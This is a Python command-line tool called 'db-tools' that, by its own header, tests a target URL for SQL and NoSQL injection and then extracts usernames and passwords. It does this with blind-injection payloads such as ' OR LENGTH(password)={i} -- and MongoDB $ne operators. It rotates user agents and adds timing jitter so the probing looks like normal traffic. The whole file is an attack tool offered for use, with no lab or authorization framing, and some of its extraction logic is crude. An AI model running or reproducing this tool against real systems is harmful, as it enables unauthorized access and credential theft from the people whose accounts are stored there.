#!/usr/bin/env python3
# ┌────────────────────────────────────────────────────────┐
# │ Version        : 2026.07.24-00                         │
# │ Author         : Mark Hamilton │ Co-Pilot AI assisted  │
# │ Script Purpose : Detect SQLi/NoSQLi & extract db creds │
# │ Package        : toolbox                               │
# └────────────────────────────────────────────────────────┘
#
# Usage:
#   db-tools --url <target> [--username <user>] [--dry-run] [--verbose] [--log] [--hashmap]
#
# Description:
#   Performs automated SQL and NoSQL injection testing against a target endpoint.
#   Determines injection type, enumerates valid usernames, and extracts passwords
#   using blind-injection techniques. Includes randomised user-agents and timing
#   jitter to simulate realistic probing behaviour.
#
# Output Files:
#   /var/log/db-tools.log                 (when --log is used)
#   .hashmap/db-tools.hash                (when --hashmap is used)
#   .hashmap/db-tools.timestamp           (when --hashmap is used)
#
# End Help

import argparse
import os
import sys
import hashlib
import datetime
import requests
import random
import time

# ─── Metadata ─────────────────────────────────────────────
TOOL_NAME = "db-tools"
VERSION = "2026.07.24-00"

LOGFILE = f"/var/log/{TOOL_NAME}.log"
HASHDIR = ".hashmap"
HASHFILE = f"{HASHDIR}/{TOOL_NAME}.hash"
TIMESTAMP = f"{HASHDIR}/{TOOL_NAME}.timestamp"

# ─── Error Signatures ─────────────────────────────────────
SQL_ERRORS = [
    "SQL syntax error", "quoted string not properly terminated",
    "unclosed quotation mark", "You have an error in your SQL syntax",
    "Unknown column", "mysql_fetch_array()"
]

NOSQL_ERRORS = [
    "MongoDB error", "NoSQL syntax error", "BSON error",
    "Invalid JSON input", "Document not found"
]

# ─── Randomised User Agents ───────────────────────────────
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)",
    "Mozilla/5.0 (X11; Linux x86_64)",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 15_2)",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 15_2) AppleWebKit/537.36"
]

# ─── Helpers ──────────────────────────────────────────────
def log(msg, verbose):
    if verbose:
        print(f"[LOG] {msg}")

def write_log(dry_run, verbose, logging, hashmap):
    if logging and not dry_run:
        os.makedirs(os.path.dirname(LOGFILE), exist_ok=True)
        with open(LOGFILE, "a") as lf:
            lf.write("=== " + TOOL_NAME + " ===\n")
            lf.write(str(datetime.datetime.now()) + "\n")
            lf.write(f"Version: {VERSION}\n")
            lf.write(f"Flags: DRY_RUN={dry_run} VERBOSE={verbose} LOGGING={logging} HASHMAP={hashmap}\n")
            lf.write("====================\n")

def write_hashmap():
    os.makedirs(HASHDIR, exist_ok=True)
    with open(TIMESTAMP, "w") as tf:
        tf.write(datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S"))
    with open(HASHFILE, "w") as hf:
        with open(sys.argv[0], "rb") as sf:
            hf.write(hashlib.sha256(sf.read()).hexdigest())

# ─── Injection Detection ──────────────────────────────────
def detect_injection(target_url, verbose):
    headers = {"User-Agent": random.choice(USER_AGENTS)}
    payload = {"input": "'"}  

    log(f"Testing injection on {target_url}", verbose)
    response = requests.post(target_url, json=payload, headers=headers)
    time.sleep(random.uniform(1.5, 5))

    if any(error in response.text for error in SQL_ERRORS):
        print("[+] Site is vulnerable to SQL Injection.")
        return "SQL"

    if any(error in response.text for error in NOSQL_ERRORS):
        print("[+] Site is vulnerable to NoSQL Injection.")
        return "NoSQL"

    print("[-] No SQL or NoSQL injection vulnerability detected.")
    return None

# ─── SQL Credential Extraction ─────────────────────────────
def extract_sql_credentials(target_url, username, verbose):
    credentials = {}

    if username:
        credentials[username] = retrieve_sql_password(target_url, username, verbose)
    else:
        for i in range(1, 50):
            headers = {"User-Agent": random.choice(USER_AGENTS)}
            payload = {"username": f"' OR LENGTH(username)={i} --", "password": "random"}
            response = requests.post(target_url, json=payload, headers=headers)
            time.sleep(random.uniform(1.5, 5))

            if "Invalid password" in response.text:
                new_user = extract_value(response.text)
                if new_user and new_user not in credentials:
                    print(f"[+] Found username: {new_user}")
                    credentials[new_user] = retrieve_sql_password(target_url, new_user, verbose)
                else:
                    break
            else:
                break

    print("\nDiscovered Credentials:")
    for user, password in credentials.items():
        print(f"- {user}: {password}")

def retrieve_sql_password(target_url, username, verbose):
    discovered_passwords = []

    for i in range(1, 50):
        headers = {"User-Agent": random.choice(USER_AGENTS)}
        payload = {"username": username, "password": f"' OR LENGTH(password)={i} --"}
        response = requests.post(target_url, json=payload, headers=headers)
        time.sleep(random.uniform(1.5, 5))

        if "Invalid password" in response.text:
            new_password = extract_value(response.text)
            if new_password and new_password not in discovered_passwords:
                print(f"[+] Found password for {username}: {new_password}")
                discovered_passwords.append(new_password)
            else:
                break
        else:
            break

    return discovered_passwords[-1] if discovered_passwords else "Not Found"

# ─── NoSQL Credential Extraction ───────────────────────────
def extract_nosql_credentials(target_url, username, verbose):
    credentials = {}

    if username:
        credentials[username] = retrieve_nosql_password(target_url, username, verbose)
    else:
        while True:
            headers = {"User-Agent": random.choice(USER_AGENTS)}
            payload = {"username": {"$ne": list(credentials.keys())}, "password": "random"}
            response = requests.post(target_url, json=payload, headers=headers)
            time.sleep(random.uniform(1.5, 5))

            if "Invalid password" in response.text:
                new_user = extract_value(response.text)
                if new_user and new_user not in credentials:
                    print(f"[+] Found username: {new_user}")
                    credentials[new_user] = retrieve_nosql_password(target_url, new_user, verbose)
                else:
                    break
            else:
                break

    print("\nDiscovered Credentials:")
    for user, password in credentials.items():
        print(f"- {user}: {password}")

def retrieve_nosql_password(target_url, username, verbose):
    discovered_passwords = []

    while True:
        headers = {"User-Agent": random.choice(USER_AGENTS)}
        payload = {"username": username, "password": {"$ne": discovered_passwords}}
        response = requests.post(target_url, json=payload, headers=headers)
        time.sleep(random.uniform(1.5, 5))

        if "Invalid password" in response.text:
            new_password = extract_value(response.text)
            if new_password and new_password not in discovered_passwords:
                print(f"[+] Found password for {username}: {new_password}")
                discovered_passwords.append(new_password)
            else:
                break
        else:
            break

    return discovered_passwords[-1] if discovered_passwords else "Not Found"

# ─── Response Parsing ─────────────────────────────────────
def extract_value(response_text):
    return response_text.split(":")[1].strip()

# ─── Main Logic ───────────────────────────────────────────
def main_logic(args):
    log(f"Starting {TOOL_NAME} version {VERSION}", args.verbose)

    if args.dry_run:
        print("[DRY-RUN] Injection testing and credential extraction simulated.")
        return

    db_type = detect_injection(args.url, args.verbose)

    if db_type == "SQL":
        extract_sql_credentials(args.url, args.username, args.verbose)
    elif db_type == "NoSQL":
        extract_nosql_credentials(args.url, args.username, args.verbose)

# ─── Main Entry Point ─────────────────────────────────────
def main():
    parser = argparse.ArgumentParser(description=f"{TOOL_NAME} — toolbox Python tool")
    parser.add_argument("--url", required=True, help="Target URL of the vulnerable endpoint")
    parser.add_argument("--username", help="Optional: extract password for a specific user")
    parser.add_argument("--dry-run", action="store_true", help="Simulate actions without executing")
    parser.add_argument("--verbose", action="store_true", help="Enable verbose logging")
    parser.add_argument("--log", action="store_true", help="Write execution details to log file")
    parser.add_argument("--hashmap", action="store_true", help="Generate traceability files")
    args = parser.parse_args()

    main_logic(args)

    if args.log:
        write_log(args.dry_run, args.verbose, args.log, args.hashmap)

    if args.hashmap:
        write_hashmap()

if __name__ == "__main__":
    main()
              
